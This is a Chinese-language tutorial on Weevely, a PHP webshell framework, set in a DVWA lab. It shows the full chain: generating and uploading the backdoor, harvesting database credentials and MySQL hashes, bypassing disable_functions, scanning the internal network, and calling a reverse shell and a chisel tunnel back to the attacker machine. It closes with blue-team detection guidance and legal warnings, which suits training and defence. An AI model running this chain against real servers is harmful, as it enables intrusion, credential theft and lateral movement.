# Weevely（PHP 隐蔽 WebShell 与后利用框架）

> **一句话**：生成一个「小、多变、不易被杀软特征匹配」的 PHP 后门，通过普通 HTTP 请求通信，给你一个类似 telnet 的交互式 shell，以及 40+ 个后利用模块（文件、SQL、内网扫描、反向 shell、提权审计）。
> **分类**：后渗透 / Web 应用后利用（持久化）｜ **Kali 包**：`weevely`（命令 `weevely`）｜ **官方文档**：<https://github.com/epinna/weevely3/wiki>

---

## 1. 它解决什么问题

拿到 Web 应用的命令执行/文件上传能力后，你需要一个**稳定的落脚点**。裸的一句话木马（`<?php system($_GET[1]);?>`）有三个致命问题：

1. **特征固定** → 杀软/主机防护（HIDS）一眼识别；
2. **无交互** → 只能 `?cmd=ls` 手工拼 URL，`cd` 都做不到；
3. **没工具** → 想传文件、连数据库、扫内网，全靠自己写请求。

Weevely 把这三件事都解决了：

| 一句话木马的痛点 | Weevely 的解决 |
|------------------|----------------|
| 特征明显 | agent **多态混淆**，每次生成不同；通信载荷混淆在 HTTP 请求里 |
| 无交互 | `weevely <URL> <密码>` 得到 telnet 风格 shell，支持 `cd`、Tab、历史 |
| 没工具 | 40+ 模块：`:file_ls`、`:sql_console`、`:net_scan`、`:backdoor_reversetcp`… |
| 会话难续 | 会话持久化到 `sessions/`，掉线可 `weevely session <file>` 恢复 |

对比同类：

| 工具 | 位置 | 特点 |
|------|------|------|
| **weevely** | Linux 攻击机 ↔ PHP 目标 | 交互 + 模块体系 + 混淆 agent |
| 裸一句话木马 | —— | 零依赖、零能力 |
| **`beef-xss`** | 攻击客户端浏览器 | 完全不同场景，见 [`../06-漏洞利用/beef-xss.md`](../06-漏洞利用/beef-xss.md) |
| **`powershell-empire`** | Windows 目标 | Windows 侧的对应物，见 [`powershell-empire.md`](powershell-empire.md) |
| **`chisel`/`ligolo-ng`** | 网络层隧道 | Weevely 装在 Web 服务器上之后，可再用它们把内网打通 |

**适用前提**：目标用 PHP（或可执行 PHP），且有可写的 Web 目录**或**能被 HTTP 访问的落地点。

---

## 2. 工作原理

```
① weevely generate <密码> <路径>
       │  生成 weevely.php：一个「多态 + 混淆」的 PHP agent
       ▼
② 把 agent 上传/写入目标 Web 目录（上传点 / LFI+RCE / 文件写入漏洞 / FTP）
       ▼
③ weevely http://target/uploads/weevely.php <密码>
       │
       │  每个「命令」都被打包成一次 HTTP 请求：
       │    POST /uploads/weevely.php
       │    <混淆后的载荷：模块名 + 参数 + 加密后的结果 ID>
       ▼
④ PHP agent 解密 → 用 PHP 函数执行（system/proc_open/passthru…）
   → 把输出加密后回写到 HTTP 响应
       │
       ▼
⑤ Kali 侧解密并渲染 → 你看到正常的 shell 输出；会话状态保存到
   sessions/<host>/weevely.session
```

关键机制：

- **混淆（obfuscation）**：`weevely generate` 支持不同的混淆方式（默认与 `-obfuscator` 可选），目标是让每次生成的 agent **文件哈希不同、静态特征不明显**。注意：**这只能绕过静态特征，绕不过基于行为/流量的检测**（见第 9 节）。
- **模块即函数**：`:file_ls`、`:net_scan` 等模块是「服务端执行逻辑 + 客户端参数解析」的组合。`weevely` 客户端把模块名和参数发过去，agent 侧执行。
- **依赖「PHP 可用」**：agent 用 PHP 内置函数实现功能。**如果目标禁用了 `system`/`exec`/`proc_open`/`popen`**（`disable_functions`），很多模块会失效——这时用 `:audit_disablefunctionbypass`（借助 `.htaccess` + mod_cgi）等绕过模块。
- **通信形态**：都是普通 HTTP POST，因此**经过 CDN/WAF 也能工作**（除非 WAF 有针对性规则）。同时这也意味着流量侧可以从「异常 POST 模式」检测。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install weevely
command -v weevely
weevely -h
```

```console
root@kali:~# weevely -h
usage: weevely [-h] {terminal,session,generate} ...

positional arguments:
  {terminal,session,generate}
    terminal            Run terminal or command on the target
    session             Recover an existing session
    generate            Generate new agent

options:
  -h, --help            show this help message and exit
```

最小可用流程（官方文档示例）：

```bash
# ① 生成 agent（密码自定，别用弱口令）
weevely generate s3cr3t /tmp/weevely.php
```

```console
[generate.php] Backdoor file '/tmp/weevely.php' created with password 's3cr3t'
```

```bash
# ② 上传到目标 Web 目录后连接
weevely http://192.168.56.102/uploads/weevely.php s3cr3t
```

```console
      ________                     __
     |  |  |  |----.----.-.--.----'  |--.--.
     |  |  |  | -__| -__| |  | -__|  |  |  |
     |________|____|____|___/|____|__|___  | v4.0.2
                                     |_____|
              Stealth tiny web shell

[+] Browse filesystem, execute commands or list available modules with ':help'
[+] Current session: 'sessions/192.168.56.102/weevely.session'

www-data@target:/var/www/uploads $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@target:/var/www/uploads $ :file_ls /var/www
```

> `weevely <URL> <password>` 等价于 `weevely terminal <URL> <password>`。
> 会话文件在 `sessions/<host>/weevely.session`，恢复用 `weevely session <该文件>`。

---

## 4. 核心参数详解

### 4.1 命令行

| 参数/子命令 | 作用 | 使用建议 |
|-------------|------|----------|
| `weevely generate <password> <path>` | 生成 agent | 密码用强口令（它是「你的密钥」，泄露=后门被劫持） |
| `weevely terminal <URL> <password> [cmd]` | 交互 shell 或单条命令 | 也可省略 `terminal` 直接 `weevely URL pass` |
| `weevely session <file>` | 恢复已有会话 | 掉线/换终端后继续 |
| `-h, --help` | 帮助 | 每个子命令都有独立 `-h` |
| `generate -o <out>` / 位置参数 `<path>` | 输出路径 | 默认生成到当前目录 |
| `generate -obfuscator <name>` | 选择混淆方式 | **以 `weevely generate -h` 列表为准**（如 `cleartext`、`base64`、更复杂的混淆模式） |
| `generate -agent <name>` | 选择 agent 类型 | 视版本；用 `-h` 确认可选值 |
| `generate -modules <list>` | 内嵌指定模块 | 需要「自包含 agent」时用 |
| `generate` 的 `-force` | 覆盖已存在文件 | 视版本 |

### 4.2 会话内命令（以 `:` 开头）

| 命令 | 作用 |
|------|------|
| `:help` | 列出所有可用模块（**最该先敲的**） |
| `:show <module>` | 查看模块说明与参数 |
| `:run <module> <args>` | 运行模块（也可直接写 `:module args`） |
| `:set <module> <name> <value>` / `:unset` | 设置/清除模块默认参数 |
| `:clear` | 清屏 |
| `:quit` | 退出 |
| 直接输入命令 | 走默认的 shell 模块执行（如 `id`、`ls -la`） |

### 4.3 常用模块（按用途分组，全部是真实模块名）

| 分组 | 模块 | 用途 |
|------|------|------|
| **侦察/审计** | `:system_info` | 系统信息、内核、OS |
| | `:system_procs` | 进程列表 |
| | `:system_extensions` | PHP/Web 服务器扩展（找可利用模块） |
| | `:audit_phpconf` | PHP 配置审计（`disable_functions`、`open_basedir` 等） |
| | `:audit_etcpasswd` | 用多种技巧读 `/etc/passwd` |
| | `:audit_suidsgid` | 找 SUID/SGID 二进制（提权线索） |
| | `:audit_filesystem` | 弱权限文件 |
| | `:audit_disablefunctionbypass` | 绕过 `disable_functions`（借助 `.htaccess` + mod_cgi） |
| **命令执行** | `:shell_sh` | 执行 shell 命令（默认走它） |
| | `:shell_php` | 执行 PHP 代码 |
| | `:shell_php` 之外的 `:shell_ssh` / `:shell_su` | 通过 SSH / `su` 执行 |
| **文件操作** | `:file_ls` / `:file_cd` / `:file_read` / `:file_write`（视版本） | 目录/读取/写入 |
| | `:file_upload` / `:file_download` / `:file_webdownload` | 上传、下载、从 URL 拉文件 |
| | `:file_upload2web` | 上传到 Web 目录并返回可访问 URL（**投放更多工具的标准手法**） |
| | `:file_find` / `:file_grep` / `:file_enum` | 找文件、搜内容、批量探测路径 |
| | `:file_rm` / `:file_cp` / `:file_touch` / `:file_edit` | 增删改 |
| | `:file_mount` | 通过 HTTPfs 挂载远程文件系统 |
| | `:file_zip` / `:file_tar` / `:file_gzip` / `:file_bzip2` | 打包压缩（便于打包窃取或投放） |
| | `:file_clearlog` | 从文件中删除指定字符串（**清理痕迹**，日志审计会盯这个） |
| **数据库** | `:sql_console` | 执行 SQL / 进控制台 |
| | `:sql_dump` | 类 `mysqldump` 导出 |
| | `:bruteforce_sql` | 数据库口令爆破 |
| **网络/内网** | `:net_ifconfig` | 网卡地址（发现内网网段） |
| | `:net_scan` | **从目标侧做 TCP 端口扫描**（Web 服务器的网络视角！） |
| | `:net_curl` | 类 curl 的 HTTP 请求（可用于 SSRF 式探测） |
| | `:net_proxy` / `:net_phpproxy` | 在目标上起 proxy，把 HTTP/HTTPS 浏览代理过去（**内网跳板**） |
| | `:net_mail` | 发邮件（社工/外带） |
| **维持访问** | `:backdoor_reversetcp` | **反弹 TCP shell** 到你的 Kali |
| | `:backdoor_tcp` | 在目标上监听一个端口等连接 |

> 模块集合随版本变化，**第一步永远先敲 `:help`**。

---

## 5. 实战演练

> **环境声明**：全部在**自建靶场**中进行。推荐：本机 Docker 起 **DVWA**（`docker run -d -p 8080:80 vulnerables/web-dvwa`）或虚拟机里装一台 **Metasploitable 2**（自带 `dvwa`/`mutillidae`）。示例：Kali `192.168.56.5`，靶站 `192.168.56.102`。
> **绝对禁止对互联网上的任意网站（包括你认为「有漏洞」的网站）执行任何本地文件写入或后门投放**——这不是「测试」，而是犯罪。
> **模块参数说明**：下文的模块参数写法为示例，**具体参数名请以会话内 `:show <模块名>` 为准**（不同版本会调整）。

### 场景 1：从文件上传漏洞到交互式 shell

假设 DVWA 的 File Upload 模块（security=low）允许上传任意文件：

```bash
# ① 生成 agent（混淆 + 强密码）
weevely generate 'S3cr3t-P@ss-2024' /tmp/wv.php
```

```console
[generate.php] Backdoor file '/tmp/wv.php' created with password 'S3cr3t-P@ss-2024'
```

```bash
# ② 确认它确实是个图片/文本无关的 PHP 文件（用于绕过只查扩展名的校验）
file /tmp/wv.php
head -c 120 /tmp/wv.php; echo
```

```console
/tmp/wv.php: PHP script, ASCII text
<?php $p='...'; eval(...);
```

**解读**：Weevely 的 agent 是纯 PHP，**没有魔术字节伪装**。如果上传点只校验扩展名（DVWA low），直接 `mv /tmp/wv.php /tmp/wv.php.jpg` 不行——要按目标逻辑来：有的校验 `Content-Type`，有的校验后缀白名单。**先弄清校验规则再改文件名/内容**（例如加上 GIF89a 头并保留 `.php` 后缀的场景）。

```bash
# ③ 上传（用 curl 模拟上传表单）
curl -s -F 'uploaded=@/tmp/wv.php;type=image/jpeg' \
     -F 'Upload=Upload' \
     -b 'PHPSESSID=<你的会话>' \
     http://192.168.56.102/vulnerabilities/upload/ | grep -o 'hackable/uploads[^<]*'
```

```console
../../hackable/uploads/wv.php succesfully uploaded!
```

```bash
# ④ 连接
weevely http://192.168.56.102/hackable/uploads/wv.php 'S3cr3t-P@ss-2024'
```

```console
[+] Current session: 'sessions/192.168.56.102/weevely.session'
www-data@target:/var/www/html/hackable/uploads $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@target:/var/www/html/hackable/uploads $ uname -a
Linux target 5.4.0-xx-generic #xx-Ubuntu SMP x86_64 GNU/Linux
```

**判断成功**：出现 `www-data@target:<cwd> $` 提示符，且 `id` 返回预期用户（通常是 Web 服务器用户）。

### 场景 2：Web 后利用全套（审计 → 找凭据 → 提权线索 → 内网侦察）

```console
# ① 先看环境与限制（决定后续哪些模块能用）
www-data@target:/ $ :audit_phpconf
```
```console
disable_functions: exec,passthru,shell_exec,system   ← 命令执行被禁！
open_basedir: (none)
safe_mode: Off
```
```console
www-data@target:/ $ :system_info
www-data@target:/ $ :system_extensions
```

**解读**：如果 `disable_functions` 里禁了 `system/exec/passthru/shell_exec`，`:shell_sh` 会失败。这时：

```console
# 尝试绕过 disable_functions（借助 .htaccess + mod_cgi）
www-data@target:/ $ :audit_disablefunctionbypass
```
```console
[+] New PHP agent uploaded to: /var/www/html/uploads/.htaccess_xxx.php
```

```console
# ② 找配置文件里的数据库凭据（Web 后利用最实际的收益）
www-data@target:/ $ :file_grep 'DB_PASSWORD\|password\|passwd' /var/www/html --ext php,conf,inc,env
```
```console
/var/www/html/config/database.php: define('DB_PASSWORD', 'W3bApp2024!');
```

```console
# ③ 用找到的凭据连数据库（在目标侧执行，不需要数据库对 Kali 开放）
www-data@target:/ $ :sql_console -db mysql -user webapp -passwd 'W3bApp2024!' -host localhost -query 'select user,authentication_string from mysql.user'
```
```console
user      authentication_string
--------  ------------------------------------------
webapp    *A4B6157319038724E3560894F7F932C8886EBFCF
root      *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
```

```console
# ④ 提权线索
www-data@target:/ $ :audit_suidsgid
www-data@target:/ $ :audit_etcpasswd
www-data@target:/ $ :system_procs
```

```console
# ⑤ 内网侦察：从 Web 服务器视角扫内网
www-data@target:/ $ :net_ifconfig
```
```console
eth0 192.168.56.102/24
eth1 10.10.20.102/24      ← 发现内网网段！
```
```console
www-data@target:/ $ :net_scan -addr 10.10.20.0/24 -ports 22,445,3389,5985 -threads 20
```
```console
10.10.20.5:445 open
10.10.20.5:3389 open
10.10.20.6:22 open
```

**解读**：`:net_scan` 的价值在于**绕过边界防火墙**——这些内网主机可能只允许「内网来源」访问，而 Web 服务器正好在内网。发现内网后，用 `:net_proxy` 起代理，或直接用 [`chisel.md`](chisel.md) 铺隧道（`file_upload2web` 可以把 chisel 二进制传到 Web 目录再下载执行）。

```console
# ⑥ 起代理，把内网 HTTP 浏览搬到 Kali
www-data@target:/ $ :net_proxy -port 1080
www-data@target:/ $ :net_phpproxy
```

### 场景 3：拿一个真正的反向 shell，然后切到正规工具

Weevely 的 shell 每次命令都是一次 HTTP 请求，**交互性有限、不能跑交互式程序**（如 `ssh`、`mysql` 交互界面）。所以标准做法是：**用 Weevely 建立的立足点，换取一个真正的 TCP shell**。

```console
# ① Kali 先起监听
```
```bash
nc -lvnp 4444
```

```console
# ② 让目标反弹回来
www-data@target:/ $ :backdoor_reversetcp -host 192.168.56.5 -port 4444
```
```console
[+] Reverse shell connected: 192.168.56.5:4444
```

```console
# ③ 升级为 PTY（在反弹回来的 shell 里）
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

**解读**：升级 PTY 之后，Tab 补全、`vi`、`top` 都能用，才算「真 shell」。

```console
# ④ 用 Weevely 的 file_upload2web 把隧道工具投送到 Web 目录
www-data@target:/ $ :file_upload2web -file /tmp/chisel -urlpath /uploads/chisel
```
```console
[+] File uploaded: http://192.168.56.102/uploads/chisel
```

```bash
# ⑤ 用反向 shell 执行它，建立内网隧道（见 chisel.md）
cd /tmp && wget -q http://127.0.0.1/uploads/chisel -O c && chmod +x c
./c client http://192.168.56.5:8080 R:socks kali:S3cretPass &
```

```bash
# ⑥ 在 Kali 上用 proxychains 打内网（见 proxychains4.md）
proxychains4 -q nxc smb 10.10.20.5 -u webapp -p 'W3bApp2024!' --shares
```

**解读**：这就是 Web 后利用的完整闭环：**WebShell（Weevely）→ 反向 shell → 隧道（Chisel/Ligolo-ng）→ 内网横向**。

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `Backdoor file '...' created with password '...'` | agent 生成成功 | 上传到目标 |
| `[+] Current session: 'sessions/<host>/weevely.session'` | 会话已保存 | 掉线后 `weevely session <文件>` |
| `www-data@target:/cwd $` | 已获得 shell | 先 `:help`、`:audit_phpconf` |
| `:shell_sh` 返回空/报错 | `disable_functions` 禁了执行函数 | `:audit_phpconf` 确认 → `:audit_disablefunctionbypass` |
| `:file_grep` 命中 `password = '...'` | **找到明文凭据** | 用于数据库/横向（授权测试中作为证据记录） |
| `:net_scan` 发现内部网段 | 目标双网卡 / 该网段可达 | `:net_ifconfig` 确认 → 建隧道 |
| `:backdoor_reversetcp` 成功 | 拿到真正的 TCP shell | 升级 PTY，切换正规工具 |
| `Error: 404` | agent 路径错/被删 | 检查上传结果与 Web 目录权限 |
| `Error: Wrong password` | 密码不符 | 用生成时的密码；会话文件也可能记着 |
| 每次命令都慢 | 每命令一次 HTTP 往返 | 这是设计使然；要交互就换反向 shell |
| 上传后被立即删除 | EDR/文件监控 | 说明防护生效（见第 9 节） |

---

## 7. 与其他工具配合

```
① 拿到 Web 命令执行/文件上传
        │
② weevely generate → 上传 agent → 交互 shell（本文）
        │
├─► :file_grep / :sql_console ──► 数据库凭据、应用配置
├─► :audit_suidsgid / :audit_etcpasswd ──► Linux 提权线索
├─► :net_ifconfig / :net_scan ──► 内网网段与存活主机
├─► :backdoor_reversetcp ──► 真正的 TCP shell（升级 PTY）
└─► :file_upload2web ──► 投放 chisel / ligolo-agent / linpeas
                              │
                              ▼
                     隧道（chisel / ligolo-ng）+ proxychains4
                              │
                              ▼
                     内网横向（nxc / impacket / evil-winrm）
```

- 隧道：[`chisel.md`](chisel.md)、[`ligolo-ng.md`](ligolo-ng.md)、[`proxychains4.md`](proxychains4.md)
- Linux 提权（拿到 shell 之后）：[`linpeas.md`](linpeas.md)、[`linux-exploit-suggester.md`](linux-exploit-suggester.md)
- Windows 侧的「shell 后期」框架：[`powershell-empire.md`](powershell-empire.md)
- 客户端（浏览器）侧：[`../06-漏洞利用/beef-xss.md`](../06-漏洞利用/beef-xss.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `404 Not Found` | agent 不在那个路径 / 被上传策略改名 | 从上传响应里确认真实路径；检查 Web 根目录 |
| `Wrong password` | 密码不匹配 | 用 `generate` 时的密码；或重生成 |
| 上传被拒：`Your image was not uploaded. We can only accept JPEG and PNG images.` | 目标只允许图片 | 结合图片马（GIF89a 头 + PHP 代码）或找其它写入点；**先读清校验逻辑** |
| 上传成功但访问报 500 | PHP 语法/版本不兼容 | 检查目标 PHP 版本；换混淆方式或简化 agent |
| `:shell_sh` 无输出 | `disable_functions` 禁了 `system` 等 | `:audit_phpconf` → `:audit_disablefunctionbypass` |
| `open_basedir restriction` | PHP 限制目录 | 只能在允许目录内操作；找 `open_basedir` 配置弱点 |
| 中文乱码 | 编码 | 用 `:shell_php` 配合 `mb_convert_encoding`，或改用 `:file_read` 取文件后本地看 |
| 交互式命令（`ssh`/`mysql`）卡死 | Weevely 是「每命令一次 HTTP」模型 | 用 `:backdoor_reversetcp` 换成真 shell |
| agent 一上传就被删 | 目标有文件监控/杀软 | 换混淆/换落地位置；可能说明防护有效 |
| WAF 拦掉请求 | 载荷特征/WAF 规则 | 减小载荷、换模块、绕 WAF（授权环境）；或改走其它落脚点 |
| 会话文件丢了 | 本地 `sessions/` 被删 | 重新连接即可生成新会话；密码不变 |
| 换目录后路径错乱 | 模块的工作目录与 agent 位置不同 | 用 `:file_cd` 或绝对路径 |
| `:net_scan` 结果全空 | 目标出站被限制 | 换端口/协议；或放弃从目标扫描，改在隧道里扫 |

---

## 9. 防御视角（蓝队）

| 攻击面 | 检测信号 | 缓解措施 |
|--------|----------|----------|
| **WebShell 落地** | Web 目录新增 PHP 文件（尤其非发布流程产生）；文件内容含 `eval`/`assert`/`base64_decode` 组合 | **上传目录禁止执行 PHP**（`php_admin_flag engine off`）、文件完整性监控（FIM）、部署流程只允许 CI 写入 |
| **异常 POST 通信** | 同一路径高频 POST、参数名随机且值高熵、响应体加密不透明 | WAF 规则（异常参数熵值）、出站/入站异常请求基线告警 |
| **文件上传漏洞本身（根因）** | 上传接口接收 `.php` 或双扩展名 | 白名单扩展名 + 重命名 + 存储与执行分离（对象存储）+ MIME/魔术字节双重校验 |
| `:file_grep` 搜凭据 | 大量文件读取、Web 目录遍历 | 最小权限运行 Web、配置文件凭据加密/改用密钥管理服务、`open_basedir` 限制 |
| `:net_scan` 内网扫描 | Web 服务器发起到内网主机的**大量连接** | Web 服务器出站限制（只允许必要后端）、内网分段 |
| `:backdoor_reversetcp` | Web 服务器**出站**到非常规端口的长连接（`php-fpm`/`apache` 进程发起） | 出站白名单、EDR 监控 Web 进程网络行为（**高价值信号**） |
| `:file_clearlog`（清痕迹） | Web 访问日志被改写/截断 | 日志**实时外发**到集中平台（本地被改也留有副本）、只追加写入权限 |
| `:audit_disablefunctionbypass` | `.htaccess` 被写入/新增、`AddHandler cgi-script` 出现 | 禁止 `.htaccess` 覆盖（`AllowOverride None`）、限制 mod_cgi |
| 提权（SUID 等） | SUID 文件被创建、异常提权行为 | 定期审计 SUID/`sudoers`、最小权限、内核与软件及时打补丁 |
| 与隧道工具联动 | Web 目录出现非 Web 用途的二进制（`chisel`、`agent`） | FIM + 执行白名单（`noexec` 挂载 Web 目录） |

**蓝队最重要的一条**：**上传目录必须禁止执行脚本**。这一条就能让「上传 → WebShell」这条链断掉。其次是**Web 进程的出站访问控制**，它直接掐死反向 shell 与隧道。

---

## 10. 参考

- Weevely 官方 Wiki（模块全集与用法）：<https://github.com/epinna/weevely3/wiki>
- Weevely 官方仓库：<https://github.com/epinna/weevely3>
- Kali 工具页：<https://www.kali.org/tools/weevely/>
- OWASP · 不安全文件上传与 WebShell 防护：<https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
- 本地命令：`weevely -h`、`weevely generate -h`，以及会话内 `:help`、`:show <module>`

## ⚠️ 法律与伦理

**在他人网站上投放 WebShell 是典型的严重犯罪行为。** 可能触犯《刑法》第 285 条（非法侵入计算机信息系统、非法获取计算机信息系统数据、非法控制计算机信息系统）、第 286 条（破坏计算机信息系统），若涉及窃取数据还可能构成侵犯公民个人信息罪、非法获取商业秘密罪等；违反《网络安全法》第 27 条另需承担行政责任。

`weevely generate` 出的 agent 就是**后门**。请仅在以下场景使用：
1. **书面授权**的 Web 应用渗透测试（授权书需明确允许「后渗透与持久化测试」）；
2. **CTF 竞赛**环境；
3. **你自建的靶场**（DVWA、Metasploitable、VulnHub、本机 Docker）。

测试结束必须：删除靶机上投放的所有 agent 与工具文件；恢复被修改的配置（如 `.htaccess`）；将提取到的凭据加密上报并及时销毁；报告中绝不含可直接复用的后门与口令。
